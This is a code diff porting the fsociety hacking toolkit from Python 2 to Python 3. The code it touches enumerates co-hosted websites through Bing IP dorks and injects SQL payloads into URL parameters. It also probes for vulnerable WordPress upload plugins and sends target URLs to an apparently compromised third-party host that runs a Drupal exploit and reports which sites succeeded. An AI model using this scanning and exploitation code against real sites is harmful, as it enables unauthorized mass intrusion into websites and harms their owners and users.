@@ -23,9 +23,9 @@ import os
 import http.client as httplib
 import subprocess
 import re
-import urllib as urllib2
 import socket
-import urllib
+import urllib.request
+import urllib.error
 import sys
 import json
 import telnetlib
@@ -202,7 +202,7 @@ class fsociety:
      YboodP  YbodP  88  Y8   88   88  Yb 88 88oodP 8bodP'
      ''')
         contributorsURL = 'https://api.github.com/repos/manisso/fsociety/contributors'
-        jsonResponseList = json.loads(urllib2.urlopen(contributorsURL).read())
+        jsonResponseList = json.loads(urllib.request.urlopen(contributorsURL).read())
         for dictionary in jsonResponseList:
             print("   * %s" % dictionary['login'])
         print('\n')
@@ -1249,7 +1249,7 @@ def bing_all_grabber(s):
         try:
             bing = "http://www.bing.com/search?q=ip%3A" + \
                 s + "+&count=50&first=" + str(page)
-            openbing = urllib2.urlopen(bing)
+            openbing = urllib.request.urlopen(bing)
             readbing = openbing.read()
             findwebs = re.findall('<h2><a href="(.*?)"', readbing)
             for i in range(len(findwebs)):
@@ -1263,7 +1263,7 @@ def bing_all_grabber(s):
                 lista.extend(findall1)
 
             page += 50
-        except urllib2.URLError:
+        except urllib.error.URLError:
             pass
 
     final = unique(lista)
@@ -1412,7 +1412,7 @@ class Fscan:
             try:
                 bing = "http://www.bing.com/search?q=ip%3A" + \
                     self.serverip + "+&count=50&first=" + str(page)
-                openbing = urllib2.urlopen(bing)
+                openbing = urllib.request.urlopen(bing)
                 readbing = openbing.read()
                 findwebs = re.findall('<h2><a href="(.*?)"', readbing)
                 for i in range(len(findwebs)):
@@ -1426,7 +1426,7 @@ class Fscan:
                     lista.extend(findall1)
 
                 page += 50
-            except urllib2.URLError:
+            except urllib.error.URLError:
                 pass
         self.sites = unique(lista)
         if a:
@@ -1448,7 +1448,7 @@ class Fscan:
             try:
                 bing = "http://www.bing.com/search?q=ip%3A" + \
                     self.serverip + "+?page_id=&count=50&first=" + str(page)
-                openbing = urllib2.urlopen(bing)
+                openbing = urllib.request.urlopen(bing)
                 readbing = openbing.read()
                 findwebs = re.findall('<h2><a href="(.*?)"', readbing)
                 for i in range(len(findwebs)):
@@ -1475,7 +1475,7 @@ class Fscan:
         while page <= 101:
             bing = "http://www.bing.com/search?q=ip%3A" + self.serverip + \
                 "+index.php?option=com&count=50&first=" + str(page)
-            openbing = urllib2.urlopen(bing)
+            openbing = urllib.request.urlopen(bing)
             readbing = openbing.read()
             findwebs = re.findall('<h2><a href="(.*?)"', readbing)
             for i in range(len(findwebs)):
@@ -1570,7 +1570,7 @@ class Fscan:
                     site = site.replace('-', '')
                 site = site.replace('/', '')
                 while len(site) > 2:
-                    resp = urllib2.urlopen(
+                    resp = urllib.request.urlopen(
                         site1 + '/cgi-sys/guestbook.cgi?user=%s' % site).read()
                     if 'invalid username' not in resp.lower():
                         print('\t [*] Found -> ', site)
@@ -1640,7 +1640,7 @@ class Fscan:
             try:
                 bing = "http://www.bing.com/search?q=ip%3A" + \
                     self.serverip + "+php?id=&count=50&first=" + str(page)
-                openbing = urllib2.urlopen(bing)
+                openbing = urllib.request.urlopen(bing)
                 readbing = openbing.read()
                 findwebs = re.findall('<h2><a href="(.*?)"', readbing)
                 for i in range(len(findwebs)):
@@ -1672,7 +1672,7 @@ class Fscan:
                     for payload in payloads:
                         power = url.replace(param, param + payload.strip())
 
-                        html = urllib2.urlopen(power).readlines()
+                        html = urllib.request.urlopen(power).readlines()
                         for line in html:
                             checker = re.findall(check, line)
                             if len(checker) != 0:
@@ -1726,8 +1726,8 @@ def drupal():
         url = "http://www.bing.com/search?q=ip%3A" + ip + "&go=Valider&qs=n&form=QBRE&pq=ip%3A" + \
             ip + "&sc=0-0&sp=-1&sk=&cvid=af529d7028ad43a69edc90dbecdeac4f&first=" + \
             str(page)
-        req = urllib2.Request(url)
-        opreq = urllib2.urlopen(req).read()
+        req = urllib.request.Request(url)
+        opreq = urllib.request.urlopen(req).read()
         findurl = re.findall(
             '<div class="b_title"><h2><a href="(.*?)" h=', opreq)
         page += 1
@@ -1739,7 +1739,7 @@ def drupal():
                 site = urlpa.netloc
 
                 print("[+] Testing At " + site)
-                resp = urllib2.urlopen(
+                resp = urllib.request.urlopen(
                     'http://crig-alda.ro/wp-admin/css/index2.php?url=' + site + '&submit=submit')
                 read = resp.read()
                 if "User: HolaKo" in read:
@@ -1767,8 +1767,8 @@ def getdrupal():
 
         url = "http://www.bing.com/search?q=ip%3A" + ip + \
             "+node&go=Valider&qs=ds&form=QBRE&first=" + str(page)
-        req = urllib2.Request(url)
-        opreq = urllib2.urlopen(req).read()
+        req = urllib.request.Request(url)
+        opreq = urllib.request.urlopen(req).read()
         findurl = re.findall(
             '<div class="b_title"><h2><a href="(.*?)" h=', opreq)
         page += 1
@@ -1790,7 +1790,7 @@ def drupallist():
     for i in content:
         url = i.strip()
         try:
-            openurl = urllib2.urlopen(
+            openurl = urllib.request.urlopen(
                 'http://crig-alda.ro/wp-admin/css/index2.php?url=' + url + '&submit=submit')
             readcontent = openurl.read()
             if "Success" in readcontent:
@@ -1838,7 +1838,7 @@ def bing_all_grabber(s):
         try:
             bing = "http://www.bing.com/search?q=ip%3A" + \
                 s + "+&count=50&first=" + str(page)
-            openbing = urllib2.urlopen(bing)
+            openbing = urllib.request.urlopen(bing)
             readbing = openbing.read()
             findwebs = re.findall('<h2><a href="(.*?)"', readbing)
             for i in range(len(findwebs)):
@@ -1852,7 +1852,7 @@ def bing_all_grabber(s):
                 lista.extend(findall1)
 
             page += 50
-        except urllib2.URLError:
+        except urllib.error.URLError:
             pass
 
     final = unique(lista)
@@ -1863,7 +1863,7 @@ def check_wordpress(sites):
     wp = []
     for site in sites:
         try:
-            if urllib2.urlopen(site + 'wp-login.php').getcode() == 200:
+            if urllib.request.urlopen(site + 'wp-login.php').getcode() == 200:
                 wp.append(site)
         except:
             pass
@@ -1875,7 +1875,7 @@ def check_joomla(sites):
     joomla = []
     for site in sites:
         try:
-            if urllib2.urlopen(site + 'administrator').getcode() == 200:
+            if urllib.request.urlopen(site + 'administrator').getcode() == 200:
                 joomla.append(site)
         except:
             pass
@@ -1913,15 +1913,15 @@ def grabsqli(ip):
         while page <= 21:
             bing = "http://www.bing.com/search?q=ip%3A" + \
                 ip + "+upload&count=50&first=" + str(page)
-            openbing = urllib2.urlopen(bing)
+            openbing = urllib.request.urlopen(bing)
             readbing = openbing.read()
             findwebs = re.findall('<h2><a href="(.*?)"', readbing)
             sites = findwebs
             for i in sites:
                 try:
-                    response = urllib2.urlopen(i).read()
+                    response = urllib.request.urlopen(i).read()
                     checksqli(i)
-                except urllib2.HTTPError, e:
+                except urllib.error.HTTPError as e:
                     str(sites).strip(i)
 
             page = page + 10
@@ -1930,7 +1930,7 @@ def grabsqli(ip):
 
 
 def checksqli(sqli):
-    responsetwo = urllib2.urlopen(sqli).read()
+    responsetwo = urllib.request.urlopen(sqli).read()
     find = re.findall('type="file"', responsetwo)
     if find:
         print(" Found ==> " + sqli)
@@ -1953,7 +1953,7 @@ def bing_all_grabber(s):
         try:
             bing = "http://www.bing.com/search?q=ip%3A" + \
                 s + "+&count=50&first=" + str(page)
-            openbing = urllib2.urlopen(bing)
+            openbing = urllib.request.urlopen(bing)
             readbing = openbing.read()
             findwebs = re.findall('<h2><a href="(.*?)"', readbing)
             for i in range(len(findwebs)):
@@ -1967,7 +1967,7 @@ def bing_all_grabber(s):
                 lista.extend(findall1)
 
             page += 50
-        except urllib2.URLError:
+        except urllib.error.URLError:
             pass
 
     final = unique(lista)
@@ -1978,7 +1978,7 @@ def check_wordpress(sites):
     wp = []
     for site in sites:
         try:
-            if urllib2.urlopen(site + 'wp-login.php').getcode() == 200:
+            if urllib.request.urlopen(site + 'wp-login.php').getcode() == 200:
                 wp.append(site)
         except:
             pass
@@ -1990,7 +1990,7 @@ def check_wpstorethemeremotefileupload(sites):
     wpstorethemeremotefileupload = []
     for site in sites:
         try:
-            if urllib2.urlopen(site + 'wp-content/themes/WPStore/upload/index.php').getcode() == 200:
+            if urllib.request.urlopen(site + 'wp-content/themes/WPStore/upload/index.php').getcode() == 200:
                 wpstorethemeremotefileupload.append(site)
         except:
             pass
@@ -2002,7 +2002,7 @@ def check_wpcontactcreativeform(sites):
     wpcontactcreativeform = []
     for site in sites:
         try:
-            if urllib2.urlopen(site + 'wp-content/plugins/sexy-contact-form/includes/fileupload/index.php').getcode() == 200:
+            if urllib.request.urlopen(site + 'wp-content/plugins/sexy-contact-form/includes/fileupload/index.php').getcode() == 200:
                 wpcontactcreativeform.append(site)
         except:
             pass
@@ -2014,7 +2014,7 @@ def check_wplazyseoplugin(sites):
     wplazyseoplugin = []
     for site in sites:
         try:
-            if urllib2.urlopen(site + 'wp-content/plugins/lazy-seo/lazyseo.php').getcode() == 200:
+            if urllib.request.urlopen(site + 'wp-content/plugins/lazy-seo/lazyseo.php').getcode() == 200:
                 wplazyseoplugin.append(site)
         except:
             pass
@@ -2026,7 +2026,7 @@ def check_wpeasyupload(sites):
     wpeasyupload = []
     for site in sites:
         try:
-            if urllib2.urlopen(site + 'wp-content/plugins/easy-comment-uploads/upload-form.php').getcode() == 200:
+            if urllib.request.urlopen(site + 'wp-content/plugins/easy-comment-uploads/upload-form.php').getcode() == 200:
                 wpeasyupload.append(site)
         except:
             pass
@@ -2038,7 +2038,7 @@ def check_wpsymposium(sites):
     wpsymposium = []
     for site in sites:
         try:
-            if urllib2.urlopen(site + 'wp-symposium/server/file_upload_form.php').getcode() == 200:
+            if urllib.request.urlopen(site + 'wp-symposium/server/file_upload_form.php').getcode() == 200:
                 wpsymposium.append(site)
         except:
             pass
